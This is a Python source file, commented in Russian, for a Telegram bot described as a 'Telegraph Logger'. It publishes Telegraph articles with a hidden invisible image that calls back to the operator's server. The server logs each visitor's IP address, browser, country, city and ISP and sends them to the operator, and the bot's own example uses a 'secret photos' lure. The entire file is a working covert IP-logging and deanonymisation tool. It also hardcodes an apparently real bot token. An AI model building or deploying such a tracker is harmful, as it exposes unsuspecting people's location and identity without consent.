import telebot
from flask import Flask, request
import requests
import sqlite3
import uuid
import threading
import time
import os
from datetime import datetime

# Токен бота (получи у @BotFather)
BOT_TOKEN = "8594559077:AAFoKX-w7hpYDXkbHc3kTEcesO4vb5fW-nw"

# Инициализация бота
bot = telebot.TeleBot(BOT_TOKEN)

# Flask приложение для веб-сервера
app = Flask(__name__)

# База данных (SQLite в файле)
conn = sqlite3.connect('logger.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS pages
             (hash TEXT PRIMARY KEY, chat_id INTEGER, title TEXT, telegra_url TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS visits
             (id INTEGER PRIMARY KEY AUTOINCREMENT, page_hash TEXT, ip TEXT, 
              user_agent TEXT, country TEXT, city TEXT, provider TEXT)''')
conn.commit()

# Функция создания статьи в Telegraph
def create_telegraph_page(title, content, tracking_hash):
    # Твой Replit URL (когда запустишь, будет видно вверху)
    repl_url = "https://" + os.environ.get('REPL_SLUG') + "." + os.environ.get('REPL_OWNER') + ".repl.co"
    pixel_url = f"{repl_url}/pixel?hash={tracking_hash}"
    
    # Формируем контент для Telegraph
    content_nodes = [
        {
            "tag": "p",
            "children": [{
                "tag": "img",
                "attrs": {
                    "src": pixel_url,
                    "style": "display:none; width:0; height:0;"
                }
            }]
        }
    ]
    
    # Добавляем текст статьи
    for paragraph in content.split('\n'):
        if paragraph.strip():
            content_nodes.append({
                "tag": "p",
                "children": [paragraph.strip()]
            })
    
    # Отправляем запрос к Telegraph API
    response = requests.post('https://api.telegra.ph/createPage', json={
        'title': title[:255],
        'author_name': 'Anonymous',
        'content': content_nodes,
        'return_content': True
    })
    
    if response.status_code == 200 and response.json()['ok']:
        return response.json()['result']['url']
    return None

# Команда /start
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, 
        "🔰 Telegraph Logger Bot\n\n"
        "Отправь мне текст в формате:\n"
        "Заголовок | Текст статьи\n\n"
        "Пример: Секретные фото | Жми сюда быстрее!"
    )

# Команда /stats
@bot.message_handler(commands=['stats'])
def stats(message):
    c.execute('SELECT COUNT(*) FROM pages WHERE chat_id = ?', (message.chat.id,))
    pages = c.fetchone()[0]
    
    c.execute('''SELECT COUNT(*) FROM visits v
                 JOIN pages p ON v.page_hash = p.hash
                 WHERE p.chat_id = ?''', (message.chat.id,))
    visits = c.fetchone()[0]
    
    bot.reply_to(message, f"📊 Статистика\nСтраниц: {pages}\nПереходов: {visits}")

# Обработка текста
@bot.message_handler(func=lambda m: True)
def handle_text(message):
    text = message.text
    
    if '|' not in text:
        bot.reply_to(message, "❌ Нужно через |\nПример: Заголовок | Текст")
        return
    
    title, content = text.split('|', 1)
    title = title.strip()
    content = content.strip()
    
    msg = bot.reply_to(message, "⏳ Создаю статью...")
    
    # Генерируем hash
    page_hash = str(uuid.uuid4())[:14]
    
    try:
        # Создаем страницу
        page_url = create_telegraph_page(title, content, page_hash)
        
        if not page_url:
            bot.edit_message_text("❌ Ошибка", msg.chat.id, msg.message_id)
            return
        
        # Сохраняем в базу
        c.execute('INSERT INTO pages (hash, chat_id, title, telegra_url) VALUES (?, ?, ?, ?)',
                  (page_hash, message.chat.id, title, page_url))
        conn.commit()
        
        bot.edit_message_text(
            f"✅ Готово!\n\n{page_url}\n\nHash: {page_hash}",
            msg.chat.id, msg.message_id
        )
        
    except Exception as e:
        bot.edit_message_text(f"❌ Ошибка: {e}", msg.chat.id, msg.message_id)

# Веб-сервер для пикселя
@app.route('/pixel')
def pixel():
    tracking_hash = request.args.get('hash')
    
    if not tracking_hash:
        return '', 400
    
    # Получаем IP
    ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Получаем гео (бесплатно)
    geo = {'country': 'Unknown', 'city': 'Unknown', 'provider': 'Unknown'}
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=2)
        if r.status_code == 200:
            data = r.json()
            geo = {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'provider': data.get('isp', 'Unknown')
            }
    except:
        pass
    
    # Получаем инфо о странице
    c.execute('SELECT chat_id, title FROM pages WHERE hash = ?', (tracking_hash,))
    page = c.fetchone()
    
    if page:
        chat_id, title = page
        
        # Сохраняем визит
        c.execute('''INSERT INTO visits (page_hash, ip, user_agent, country, city, provider)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (tracking_hash, ip, user_agent, geo['country'], geo['city'], geo['provider']))
        conn.commit()
        
        # Отправляем уведомление
        notif = f"🚨 НОВЫЙ ПЕРЕХОД!\n\nСтраница: {title}\nIP: {ip}\nСтрана: {geo['country']}\nГород: {geo['city']}\nПровайдер: {geo['provider']}"
        try:
            bot.send_message(chat_id, notif)
        except:
            pass
    
    # Прозрачный GIF
    pixel_gif = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
    return pixel_gif, 200, {'Content-Type': 'image/gif'}

# Запуск бота в отдельном потоке
def run_bot():
    bot.infinity_polling()

threading.Thread(target=run_bot, daemon=True).start()


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)